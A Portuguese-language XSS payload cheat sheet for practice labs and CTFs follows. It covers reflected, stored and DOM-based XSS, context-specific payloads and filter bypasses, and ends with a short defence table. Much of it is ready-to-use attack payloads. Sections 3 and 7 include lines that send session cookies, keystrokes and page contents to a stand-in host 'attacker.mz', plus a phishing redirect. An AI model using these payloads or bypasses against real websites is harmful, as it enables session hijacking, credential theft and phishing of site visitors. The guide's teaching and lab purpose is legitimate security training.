# XSS — Guia de Payloads (Refletido · Armazenado · DOM)

> **Uso autorizado apenas.** Estes payloads servem para praticar em ambientes
> onde tens permissão: o teu CyberLab, PortSwigger Web Security Academy,
> TryHackMe, ou sistemas teus. Testar em sites de terceiros sem autorização é crime.

XSS (Cross-Site Scripting) é conseguir executar o teu próprio JavaScript no
browser de outra pessoa. O que muda entre os três tipos é **onde vive o payload**
e **como lá chega**. Os payloads em si são quase os mesmos — o que difere é o
vetor de entrega.

---

## Índice
1. [Payloads base (funcionam em qualquer tipo)](#1-payloads-base)
2. [XSS Refletido](#2-xss-refletido)
3. [XSS Armazenado](#3-xss-armazenado)
4. [XSS DOM-based](#4-xss-dom-based)
5. [Payloads por contexto](#5-payloads-por-contexto)
6. [Bypass de filtros](#6-bypass-de-filtros)
7. [Provar impacto (para o CTF)](#7-provar-impacto)
8. [Defesa rápida](#8-defesa-rápida)

---

## 1. Payloads base

Começa sempre pelo mais simples para confirmar que executa. Se o `alert` dispara,
há XSS.

```html
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
```

Quando `<script>` é bloqueado ou não executa (ex.: inserido via innerHTML, onde
`<script>` não corre), usa handlers de eventos em tags que disparam sozinhas:

```html
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<iframe src=javascript:alert('XSS')>
<input autofocus onfocus=alert('XSS')>
<details open ontoggle=alert('XSS')>
<marquee onstart=alert('XSS')>
```

> **Dica:** `<img src=x onerror=...>` é o cavalo de batalha. O `src=x` falha de
> propósito (não existe), o que dispara o `onerror`.

---

## 2. XSS Refletido

**O que é:** o payload vai no pedido (normalmente na URL) e o servidor devolve-o
na resposta *dessa mesma vez*, sem o guardar. Executa no browser de quem abre o
link. Depende de enganar a vítima para clicar.

**Como encontrar:** procura parâmetros que aparecem ecoados na página — campos de
pesquisa, mensagens de erro, "olá, \<nome\>", filtros. Mete um valor único (ex.:
`testpol123`) e vê se aparece no HTML da resposta.

**Entrega:** o payload vai direto no parâmetro da URL.

```
https://site.mz/search?q=<script>alert('XSS')</script>
https://site.mz/search?q=<img src=x onerror=alert(document.cookie)>
```

Versão URL-encoded (para colar na barra do browser sem partir):

```
https://site.mz/search?q=%3Cscript%3Ealert('XSS')%3C/script%3E
https://site.mz/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
```

**No teu CyberLab:** desafio `xss1`, na página `/search`. Mete no campo:
```html
<script>alert('XSS')</script>
```

---

## 3. XSS Armazenado

**O que é:** o payload é **guardado** no site (base de dados, ficheiro) e servido
a *todos* os que abrem a página afetada. Não precisas de enganar ninguém com um
link — a vítima só tem de visitar a página. É o mais grave.

**Como encontrar:** campos cujo conteúdo fica visível depois e é visto por outros
— comentários, nome de perfil/bio, mensagens, reviews, nome de ficheiro.

**Entrega:** submetes o payload uma vez (ex.: publicas um comentário); ele fica e
executa sempre que a página é aberta.

```html
<script>alert('XSS armazenado')</script>
<img src=x onerror=alert(document.domain)>
```

Payload "silencioso" (não mostra alert, rouba o cookie em segundo plano):

```html
<script>new Image().src='https://attacker.mz/c?k='+document.cookie</script>
<script>fetch('https://attacker.mz/c?k='+encodeURIComponent(document.cookie))</script>
```

**No teu CyberLab:** desafio `xss2`, na página `/comments`. Publica como corpo do
comentário:
```html
<script>alert(document.domain)</script>
```
Recarrega a página — executa sempre, e para qualquer visitante. É essa a
diferença para o refletido.

---

## 4. XSS DOM-based

**O que é:** o payload **nunca passa pelo servidor**. É o próprio JavaScript da
página que lê uma *source* (fonte controlável pelo utilizador) e a escreve num
*sink* perigoso, executando-a no browser. O servidor pode nem ver o payload
(sobretudo o que vem depois do `#`, que não é enviado ao servidor).

**Sources comuns (de onde o JS lê):**
```
location.hash        document.URL        location.search
location.href        document.referrer   window.name
```

**Sinks perigosos (onde o JS escreve/executa):**
```
element.innerHTML    document.write()    eval()
outerHTML            insertAdjacentHTML  setTimeout('string')
location = ...        jQuery: $(...).html()
```

**Entrega:** normalmente no fragmento da URL (`#...`), que o JS lê de
`location.hash`.

```
https://site.mz/page#<img src=x onerror=alert('XSS')>
https://site.mz/page#<svg onload=alert(1)>
```

Exemplo do código vulnerável que torna isto possível:
```javascript
// VULNERÁVEL: lê o hash e escreve-o como HTML
document.getElementById('out').innerHTML = location.hash.substring(1);
```

Se o sink for `eval` ou `setTimeout`, o payload é JavaScript puro, sem tags:
```
https://site.mz/page#;alert('XSS')
```

> **Como distinguir de refletido:** se vês o payload a executar mas ele **não
> aparece no HTML que o servidor enviou** (vê o "ver código-fonte" vs. o
> inspetor), é DOM-based. O servidor mandou a página limpa; foi o JS que injetou.

---

## 5. Payloads por contexto

O payload certo depende de **onde** o teu input cai no HTML. Esta é a parte que
separa quem decorou de quem percebeu — e é provável que te perguntem na entrevista.

### a) Dentro do corpo do HTML
Input cai entre tags: `<div> AQUI </div>`
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

### b) Dentro de um atributo HTML
Input cai num valor: `<input value="AQUI">`. Tens de "sair" do atributo primeiro:
```html
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
" autofocus onfocus=alert(1) x="
```
Se as aspas estão a ser filtradas mas o atributo não tem aspas (`value=AQUI`):
```html
x onmouseover=alert(1)
```

### c) Dentro de uma string JavaScript
Input cai dentro de `<script>var a='AQUI';</script>`. Fecha a string e a tag:
```javascript
';alert(1)//
</script><script>alert(1)</script>
'-alert(1)-'
```

### d) Dentro de um href / URL
Input cai em `<a href="AQUI">`:
```
javascript:alert(1)
javascript:alert(document.cookie)
```

---

## 6. Bypass de filtros

Quando o site tenta bloquear, mas o faz mal.

**Bloqueia a palavra `script`** → usa tags sem script:
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

**Bloqueia `<script>` só em minúsculas** → mistura maiúsculas (HTML não liga):
```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x ONERROR=alert(1)>
```

**Remove `<script>` uma vez só** (replace não recursivo) → aninha:
```html
<scr<script>ipt>alert(1)</scr</script>ipt>
```

**Bloqueia parênteses `()`** → usa backticks ou alternativas:
```html
<script>alert`1`</script>
<img src=x onerror="alert`1`">
```

**Bloqueia `alert`** → usa outra função ou acesso dinâmico:
```html
<img src=x onerror="confirm(1)">
<img src=x onerror="print()">
<script>window['al'+'ert'](1)</script>
```

**Filtra aspas e espaços** → usa `/` como separador e entidades HTML:
```html
<img/src=x/onerror=alert(1)>
<svg/onload=alert&lpar;1&rpar;>
```

**Entrada em JSON/encoding** → experimenta encoding duplo ou unicode:
```
%253Cscript%253E   (double URL encode)
<script> (unicode escape)
```

**No teu CyberLab:** desafio `xss3` (`/profile`) filtra só a palavra `<script>`.
Contorna com:
```html
<img src=x onerror=alert('XSS')>
```

---

## 7. Provar impacto

Num CTF/entrevista, `alert(1)` prova que executa, mas mostrar **o que um atacante
faria** vale mais pontos. Usa estes em labs teus.

**Roubar o cookie de sessão** (clássico):
```html
<script>new Image().src='https://attacker.mz/steal?c='+document.cookie</script>
```

**Roubar com fetch (mais discreto):**
```html
<script>fetch('https://attacker.mz/s?c='+encodeURIComponent(document.cookie))</script>
```

**Keylogger simples:**
```html
<script>document.onkeypress=e=>fetch('https://attacker.mz/k?='+e.key)</script>
```

**Redirecionar para página de phishing:**
```html
<script>location='https://attacker.mz/login-falso'</script>
```

**Ler conteúdo da página (ex.: dados sensíveis / tokens no DOM):**
```html
<script>fetch('https://attacker.mz/d?='+btoa(document.body.innerHTML))</script>
```

> `HttpOnly` no cookie impede o roubo via `document.cookie` — mas **não** impede
> o XSS. O atacante ainda pode agir em nome da vítima (fazer pedidos
> autenticados). Bom ponto para mencionar na entrevista.

---

## 8. Defesa rápida

A mesma raiz resolve os três: **nunca confiar no input, tratar sempre a saída.**

| Tipo | Defesa principal |
|------|------------------|
| **Refletido / Armazenado** | **Output encoding conforme o contexto** (escapar `< > " ' &`). Em templates, deixar o autoescape ligado (Jinja2 `{{ x }}`, React escapa por defeito). |
| **Armazenado (HTML rico)** | Se tens de aceitar formatação, sanitizar com **allowlist**: `DOMPurify` (JS), `bleach` (Python). |
| **DOM-based** | Usar `textContent` em vez de `innerHTML`. Evitar sinks: `eval`, `innerHTML`, `document.write`. |
| **Camadas extra (todos)** | `Content-Security-Policy` para bloquear scripts inline; cookie `HttpOnly` para proteger a sessão. |

**Regra de ouro:** encoding é a defesa, blocklist de tags não é. Bloquear
`<script>` nunca chega (ver secção 6).

---

*Referências para aprofundar: PortSwigger Web Security Academy (XSS),
OWASP XSS Cheat Sheet, PayloadsAllTheThings.*
